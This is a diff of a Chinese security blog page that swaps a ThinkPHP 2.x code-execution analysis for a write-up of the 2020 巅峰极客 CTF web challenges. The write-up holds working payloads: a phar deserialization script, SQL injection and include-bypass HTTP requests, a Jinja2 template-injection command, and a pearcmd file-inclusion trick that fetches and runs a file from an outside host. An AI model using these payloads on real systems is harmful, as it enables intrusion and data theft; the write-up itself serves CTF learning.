@@ -4,23 +4,25 @@
   <meta charset="utf-8">
   
   
-  <title>ThinkPHP 2.x任意代码执行漏洞 | oxcccccc</title>
+  <title>巅峰极客2020wp | oxcccccc</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="ThinkPHP 2.x任意代码执行漏洞影响范围thinkphp 2.1 官网的thinkphp 2.2已经修复了 漏洞复现漏洞位置  路由解析处 $res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&amp;">
+  <meta name="description" content="巅峰极客2020文章首发于安全客 babyphp2文件包含：http:&#x2F;&#x2F;eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;login登入接口ban掉： &#96;,\,@,%,#[11:00:52] 200 -   68B  - &#x2F;i">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP 2.x任意代码执行漏洞">
-<meta property="og:url" content="http://blog.ccreater.top/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="巅峰极客2020wp">
+<meta property="og:url" content="http://blog.ccreater.top/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/index.html">
 <meta property="og:site_name" content="oxcccccc">
-<meta property="og:description" content="ThinkPHP 2.x任意代码执行漏洞影响范围thinkphp 2.1 官网的thinkphp 2.2已经修复了 漏洞复现漏洞位置  路由解析处 $res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&amp;">
+<meta property="og:description" content="巅峰极客2020文章首发于安全客 babyphp2文件包含：http:&#x2F;&#x2F;eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;login登入接口ban掉： &#96;,\,@,%,#[11:00:52] 200 -   68B  - &#x2F;i">
 <meta property="og:locale" content="zh">
-<meta property="og:image" content="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png">
-<meta property="og:image" content="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png">
-<meta property="article:published_time" content="2020-01-30T13:13:11.056Z">
-<meta property="article:modified_time" content="2020-01-30T13:13:11.056Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201020155506.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20200926190107.png">
+<meta property="article:published_time" content="2020-10-20T07:51:42.731Z">
+<meta property="article:modified_time" content="2020-10-20T08:01:06.108Z">
 <meta property="article:author" content="ccreater">
-<meta property="article:tag" content="cve复现">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201020155506.png">
   
     <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
   
@@ -72,14 +74,14 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-ThinkPHP 2.x任意代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-巅峰极客2020wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2020-01-30T13:13:11.056Z" itemprop="datePublished">2020-01-30</time>
+    <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" class="article-date">
+  <time class="dt-published" datetime="2020-10-20T07:51:42.731Z" itemprop="datePublished">2020-10-20</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
   </div>
 
   </div>
@@ -90,7 +92,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      ThinkPHP 2.x任意代码执行漏洞
+      巅峰极客2020wp
     </h1>
   
 
@@ -98,46 +100,145 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p>
-<p>官网的thinkphp 2.2已经修复了</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p>
-<p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p>
-<p>路由解析处</p>
-<p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p>
-<p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p>
-<blockquote>
-<p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p>
-<p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p>
-<pre><code>/foo bar/
-#^[^0-9]$#
-+php+
-%[a-zA-Z0-9_-]%</code></pre></blockquote>
-<p>替换常量,这个就变成了</p>
-<p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p>
-<p>查看preg_replace的介绍发现</p>
-<blockquote>
-<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p>
-</blockquote>
-<p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p>
-<p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p>
-<p>构造</p>
-<pre><code class="php">$paths=array(
-    &#39;xxxx&#39;,
-    &#39;${phpinfo()}&#39;
-);</code></pre>
-<p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p>
-<p>从而导致命令执行</p>
-<p>于是构造payload</p>
-<p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p>
-<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p>
-<p>用单引号来包围所有引用就可以避免命令执行</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+        <h1 id="巅峰极客2020"><a href="#巅峰极客2020" class="headerlink" title="巅峰极客2020"></a>巅峰极客2020</h1><p><strong>文章首发于<a href="https://www.anquanke.com/post/id/218977" target="_blank" rel="noopener">安全客</a></strong></p>
+<h2 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h2><p>文件包含：<a href="http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login" target="_blank" rel="noopener">http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login</a><br>登入接口ban掉：</p>
+<pre><code>`,\,@,%,#</code></pre><pre><code>[11:00:52] 200 -   68B  - /index.php
+[11:00:53] 200 -   68B  - /index.php/login/
+[11:01:33] 200 -  583B  - /login.php
+[11:03:57] 403 -  335B  - /server-status
+[11:04:19] 403 -  336B  - /server-status/
+[11:05:21] 200 -  422B  - /upload.php
+[11:05:22] 403 -  329B  - /upload/
+[11:05:41] 301 -  383B  - /upload  -&gt;  http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/upload/
+[11:06:20] 200 -    4KB - /www.zip</code></pre><p>构造反序列化链：<code>dbCtrl::__destruct-&gt;User::__toString-&gt;Reader::__set</code></p>
+<pre><code class="php">&lt;?php
+
+Class Reader{
+    public $filename;
+    public $result;
+    public function __construct(){
+
+    }
+
+}
+
+class User
+{
+    public $id;
+    public $age=null;
+    public $nickname=null;
+    public $backup;
+    public function __construct(){
+        $this-&gt;backup=&quot;/flag&quot;;
+        $this-&gt;nickname=new Reader();
+    }
+}
+class dbCtrl
+{
+    public $hostname=&quot;127.0.0.1&quot;;
+    public $dbuser=&quot;p3rh4ps&quot;;
+    public $dbpass=&quot;p3rh4ps&quot;;
+    public $database=&quot;p3rh4ps&quot;;
+    public $name;
+    public $password;
+    public $mysqli;
+    public $token;
+    public function __construct(){
+        $this-&gt;token=new User();
+    }
+}
+
+$a = new dbCtrl();
+@unlink(&quot;phar.phar&quot;);
+$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar,phar伪协议不用phar后缀
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub,只要后面部分为__HALT_COMPILER(); 
+$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+//签名自动计算
+$phar-&gt;stopBuffering();
+</code></pre>
+<p><code>compress.zlib://phar://phar.phar/test.txt绕过限制</code></p>
+<h2 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h2><p>php:5.6.40</p>
+<p>robots.txt</p>
+<pre><code>User-agent: *
+Disallow: /admin</code></pre><pre><code>[12:31:50] 200 -   38B  - /admin/
+[12:31:50] 200 -   38B  - /admin/?/login
+[12:31:50] 200 -   38B  - /admin/index.php
+[12:31:57] 200 -   48B  - /check.php
+[12:32:13] 200 -   33B  - /robots.txt
+[12:41:07] 200 -   29B  - /admin/.bowerrc
+[12:41:26] 301 -  185B  - /admin/assets  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/assets/
+[12:41:28] 200 -    1KB - /admin/bower.json
+[12:41:38] 301 -  185B  - /admin/images  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/images/
+[12:41:39] 200 -   38B  - /admin/index.php
+[12:41:57] 200 -  620B  - /admin/package.json</code></pre><p>check.php 过滤了： </p>
+<pre><code>&quot;,&#39;,-,=,;,select</code></pre><pre><code>username=aaaa\&amp;password= /sleep(5)%23bbbb</code></pre><p>存在sql注入</p>
+<pre><code>账号密码
+admin
+uAreRigHt</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020155506.png" alt="image2642"></p>
+<pre><code>EVAL($COMMAND.&quot;=FALSE&quot;);
+过滤：;,&quot;,&#39;, ,|,`,^,\,;,/,*,(,),&amp;,$,#,f,F</code></pre><p>任意文件包含：</p>
+<pre><code>POST /admin/ HTTP/1.1
+Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrD05yt5m
+Content-Length: 161
+
+------WebKitFormBoundaryrD05yt5m
+Content-Disposition: form-data; name=&quot;command&quot;
+
+?&gt;&lt;?=include&lt;&lt;&lt;DDDD
+.bowerrc
+DDDD
+?&gt;
+------WebKitFormBoundaryrD05yt5m--
+</code></pre><p>读取flag</p>
+<pre><code>POST /admin/ HTTP/1.1
+Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+
+command=%3f%3e%3c%3f%3dinclude%7e%3c%3c%3cDDDD%0d%0a%D0%99%93%9E%98%0d%0aDDDD%0d%0a%3f%3e</code></pre><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p><code>GET /loged?name=%7B%7B2*2%7D%7D</code><br>存在SSTI<br>模板引擎jinja2</p>
+<pre><code>http://eci-2ze3domag0jprtzax0lx.cloudeci1.ichunqiu.com:8888/loged?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__==%27_IterationGuard%27%20%}{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27cat%20/flag%27).read()%22)%20}}{%%20endif%20%}{%%20endfor%20%}
+</code></pre><p>拿flag</p>
+<h2 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h2><p>任意文件读取</p>
+<p>hint:register_argc_argv</p>
+<pre><code>register_argc_argv    TRUE    
+由于该设置为 TRUE，将总是可以在 CLI SAPI 中访问到 argc（传送给应用程序参数的个数）和 argv（包含有实际参数的数组）。
+
+对于 PHP 4.3.0，在使用 CLI SAPI 时，PHP 变量 $argc 和 $argv 已被注册并且设定了对应的值。而在这之前的版本，这两个变量在 CGI 或者 模块 版本中的建立依赖于将 PHP 的设置选项 register_globals 设为 on。除了版本和 register_globals 设定以外，可以随时通过调用 $_SERVER 或者 $HTTP_SERVER_VARS 来访问它们。例如：$_SERVER[&#39;argv&#39;]</code></pre><p><a href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/" target="_blank" rel="noopener">https://khack40.info/camp-ctf-2015-trolol-web-write-up/</a></p>
+<p>找到一个类似的题目，但是他们是用变量覆盖来执行</p>
+<p>阅读pearcmd的代码发现：<code>if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;]))</code></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200926190107.png" alt="image6158"></p>
+<pre><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?list+install+--installroot+/tmp/+http://ccreater.top:60006/install.php++++++++++++++$&amp;f=pearcmd&amp;</code></pre><p>后面多余部分并不影响我们下载恶意文件</p>
+<p><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?f=/tmp/tmp/pear/download/install</code></p>
+<p>任意命令执行</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/10/20/巅峰极客2020wp/">http://blog.ccreater.top/2020/10/20/巅峰极客2020wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr24000mv4v025048wah" data-title="ThinkPHP 2.x任意代码执行漏洞" class="article-share-link">Share</a>
+      <a data-url="http://blog.ccreater.top/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" data-id="ckgho5rse0000dovdavvc1eiz" data-title="巅峰极客2020wp" class="article-share-link">Share</a>
       
 	  
 			  
@@ -161,7 +262,7 @@
 	  
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
 
     </footer>
   </div>
@@ -169,19 +270,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2020/01/31/%E6%88%91%E7%9A%842020/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          我的2020
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</div>
+      <div class="article-nav-title">LFI利用php自带的pearcmd.php直接RCE</div>
     </a>
   
 </nav>
